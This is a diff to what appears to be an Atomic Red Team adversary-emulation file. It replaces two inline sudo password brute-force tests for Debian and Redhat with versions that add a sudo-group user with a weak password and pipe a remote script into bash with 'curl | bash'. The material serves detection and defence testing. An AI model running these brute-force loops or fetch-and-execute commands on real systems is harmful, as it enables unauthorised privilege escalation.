@@ -117,76 +117,6 @@ atomic_tests:
       }
       Write-Host "End of bruteforce"
 
-- name: SUDO brute force Debian
-  auto_generated_guid: 464b63e8-bf1f-422e-9e2c-2aa5080b6f9a
-  description: |
-    Attempts to sudo with current user using passwords from a list.  Will run sudo 3 times, each with 3 different password attempts.
-    PreRequisites : debian,ubuntu,kali and pam_tally NOT configured.
-    If the password list contains the user password in last 9 entries, a sudo will be attempted and will succeed if user is in /etc/sudoers.
-    The /var/log/auth.log will show evidence of "3 incorrect password attempts" or "user NOT in sudoers"
-  supported_platforms:
-  - linux
-  dependency_executor_name: sh
-  dependencies:
-  - description: |
-      Check if running on a Debian based machine.
-    prereq_command: |
-      if grep -iq "debian\|ubuntu\|kali" /usr/lib/os-release; then echo "Debian"; else echo "NOT Debian"; exit 1; fi
-      if grep -Rq "pam_tally" /etc/pam.d/*; then echo "pam_tally configured"; exit 1; fi
-      cp PathToAtomicsFolder/T1110.001/src/passwords.txt /tmp/workingfile
-      cp PathToAtomicsFolder/T1110.001/src/asker.sh /tmp/asker && chmod 755 /tmp/asker
-      if [ -x "$(command -v sudo)" ]; then echo "sudo installed"; else echo "install sudo"; fi
-    get_prereq_command: |
-      apt-get update && apt-get install -y sudo
-  executor:
-    elevation_required: false
-    command: |
-      for i in 1 2 3 ; do SUDO_ASKPASS=/tmp/asker sudo -k -A whoami && wc -l /tmp/workingfile; done
-      echo done
-    cleanup_command: |
-      rm -f /tmp/asker /tmp/workingfile
-    name: sh
-
-- name: SUDO brute force Redhat
-  auto_generated_guid: b72958a7-53e3-4809-9ee1-58f6ecd99ade
-  description: |
-    Brute force the password of a local user account which is a member of the sudo'ers group on a Redhat based Linux distribution.  
-  supported_platforms:
-  - linux
-  dependency_executor_name: sh
-  dependencies:
-  - description: |
-      Check if running on a Redhat based machine.
-    prereq_command: |
-      if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then echo "Redhat"; else echo "NOT Redhat"; exit 1; fi
-      if grep -Rq "pam_faillock" /etc/pam.d/*; then echo "pam_faillock configured"; exit 1; fi
-      if [ -x "$(command -v sudo)" ]; then echo "sudo installed"; else echo "install sudo"; fi
-      if [ -x "$(command -v openssl)" ]; then echo "openssl installed"; else echo "install openssl"; fi
-    get_prereq_command: |
-      yum -y update && yum install -y openssl sudo
-  executor:
-    elevation_required: true
-    command: |
-      useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password) target
-      su target
-
-      PASSWORDS=(one two three password five); \
-          touch /tmp/file; \
-          for P in ${PASSWORDS[@]}; do \
-              date +"%b %d %T"; \
-              sudo -k && echo "$P" |sudo -S whoami &>/tmp/file; \
-              echo "exit: $?"; \
-              if grep -q "root" /tmp/file; then \
-                  echo "FOUND: sudo => $P"; break; \
-              else \
-                  echo "TRIED: $P"; \
-              fi; \
-              sleep 2; \
-          done; \
-          rm /tmp/file
-    cleanup_command: |
-      userdel target
-    name: sh
 - name: Password Brute User using Kerbrute Tool
   auto_generated_guid: 59dbeb1a-79a7-4c2a-baf4-46d0f4c761c4
   description: |
@@ -222,3 +152,77 @@ atomic_tests:
     command: |
       cd $env:temp
       .\kerbrute.exe bruteuser --dc #{domaincontroller} -d #{domain} $env:temp\bruteuser.txt TestUser1 
+
+- name: SUDO Brute Force - Debian
+  auto_generated_guid: ba1bf0b6-f32b-4db0-b7cc-d78cacc76700
+  description: |
+    An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. 
+
+    This test creates the "art" user with a password of "password123", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user
+  supported_platforms:
+  - linux
+  input_arguments:
+    remote_url:
+      description: url of remote payload
+      type: Url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh
+  dependency_executor_name: bash
+  dependencies:
+  - description: |
+      Check if running on a Debian based machine.
+    prereq_command: |
+      if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then echo "Debian"; else echo "NOT Debian"; exit 1; fi
+      if grep -Rq "pam_tally" /etc/pam.d/*; then echo "pam_tally configured"; exit 1; fi
+      if [ -x "$(command -v openssl)" ]; then echo "openssl is installed"; else echo "openssl is NOT installed"; exit 1; fi
+      if [ -x "$(command -v sudo)" ]; then echo "sudo is installed"; else echo "sudo is NOT installed"; exit 1; fi
+      if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
+    get_prereq_command: |
+      apt update && apt install -y openssl sudo curl
+  executor:
+    name: bash
+    elevation_required: true
+    command: |
+      useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art
+      su art
+      cd /tmp
+      curl -s #{remote_url} |bash
+    cleanup_command: |
+      userdel -fr art
+
+- name: SUDO Brute Force - Redhat
+  auto_generated_guid: 4097bc00-5eeb-4d56-aaf9-287d60351d95
+  description: |
+    An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. 
+
+    This test creates the "art" user with a password of "password123", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user
+  supported_platforms:
+  - linux
+  input_arguments:
+    remote_url:
+      description: url of remote payload
+      type: Url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh
+  dependency_executor_name: bash
+  dependencies:
+  - description: |
+      Check if running on a Redhat based machine.
+    prereq_command: |
+      if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then echo "RedHat"; else echo "NOT RedHat"; exit 1; fi
+      if grep -Rq "pam_faillock" /etc/pam.d/*; then echo "pam_faillock configured"; exit 1; fi
+      if [ -x "$(command -v openssl)" ]; then echo "openssl is installed"; else echo "openssl is NOT installed"; exit 1; fi
+      if [ -x "$(command -v sudo)" ]; then echo "sudo is installed"; else echo "sudo is NOT installed"; exit 1; fi
+      if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
+    get_prereq_command: |
+      yum update && yum install -y openssl sudo curl
+  executor:
+    name: bash
+    elevation_required: true
+    command: |
+      useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art
+      su art
+      cd /tmp
+      curl -s #{remote_url} |bash
+    cleanup_command: |
+      userdel -fr art
+
+
